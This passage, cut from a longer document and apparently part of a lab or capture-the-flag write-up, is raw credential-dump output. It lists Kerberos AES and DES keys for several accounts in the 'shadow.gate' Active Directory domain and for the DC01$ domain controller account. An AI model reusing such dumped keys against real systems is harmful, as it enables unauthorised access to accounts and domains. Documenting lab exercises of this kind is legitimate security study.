shadow.gate\jtrueblood:aes128-cts-hmac-sha1-96:50afd603eef473bdf7be45640ad5d013
shadow.gate\jtrueblood:des-cbc-md5:016e2cb50bfe072f
shadow.gate\jsmith:aes256-cts-hmac-sha1-96:7c4104c37ac87fbbf5d64684250193419e86f3d18eae9a17d23417f5a86eed45
shadow.gate\jsmith:aes128-cts-hmac-sha1-96:5d4afe0536471fb8650106fbda7fcf05
shadow.gate\jsmith:des-cbc-md5:100285bfe3d0ae45
shadow.gate\clocke:aes256-cts-hmac-sha1-96:3887edec327295e751ea7826c1b4b032237279891553f1d8fe7ef397f5890de5
shadow.gate\clocke:aes128-cts-hmac-sha1-96:28e81233b8dfba552878076eead12862
shadow.gate\clocke:des-cbc-md5:0db36ec83dad3834
shadow.gate\tclarke:aes256-cts-hmac-sha1-96:254bd9d7ba3833aafebf3a0f1edc10a161d70d1ac25e6895f281945857cf99a8
shadow.gate\tclarke:aes128-cts-hmac-sha1-96:75661c8dca12a1c9512949f5e3737a62
shadow.gate\tclarke:des-cbc-md5:a18c7f2f85202ad6
shadow.gate\jbradford:aes256-cts-hmac-sha1-96:25d94c55601327b69d96ff3d9c5a1bc74aab4af9079edb258fb4060f04987a20
shadow.gate\jbradford:aes128-cts-hmac-sha1-96:2d9e35f40db8fb1a835c69560617e30d
shadow.gate\jbradford:des-cbc-md5:c81fef8ff1b6e50d
shadow.gate\amoss:aes256-cts-hmac-sha1-96:12cbcd17842055be7d1b44d668179d17afff0fc02723b00303a63dfd71dd78ce
shadow.gate\amoss:aes128-cts-hmac-sha1-96:b2619bff579c763dcee02282bf877c7a
shadow.gate\amoss:des-cbc-md5:86898989f8e3675e
DC01$:aes256-cts-hmac-sha1-96:3e5da4905e17744ac5ee4526fd3f004a92f33040d69d2dfc58eacd78d27d79d0
DC01$:aes128-cts-hmac-sha1-96:19ba7742c11d88daa29ccc33ad6af8a6
DC01$:des-cbc-md5:082f25f71ab01f58**
```
